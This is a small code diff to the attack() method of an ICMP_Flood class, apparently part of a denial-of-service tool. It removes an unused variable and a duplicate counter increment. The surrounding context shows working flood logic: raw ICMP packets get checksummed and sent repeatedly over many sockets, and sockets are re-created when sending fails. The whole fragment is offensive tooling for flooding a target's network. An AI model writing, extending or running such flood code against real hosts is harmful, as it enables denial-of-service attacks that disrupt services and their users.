@@ -10,7 +10,6 @@
 #include "../Headers/Logging.hpp"
 
 void ICMP_Flood::attack() {
-    int r;
     std::vector<int> sockets;
     sockets.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
     for (int x = 0; x < conf->CONNECTIONS; x++) {
@@ -56,11 +55,9 @@ void ICMP_Flood::attack() {
 
             icmp->checksum = htons(csum((unsigned short *) buf, (sizeof(struct ip) + sizeof(struct icmphdr))));
 
-            if((r = static_cast<int>(sendto(sockets[x], buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst)))) == -1){
+            if((static_cast<int>(sendto(sockets[x], buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst)))) == -1){
                 close(sockets[x]);
                 sockets[x] = make_socket(IPPROTO_ICMP);
-            }else{
-                conf->voly++;
             }
         }
         conf->voly++;
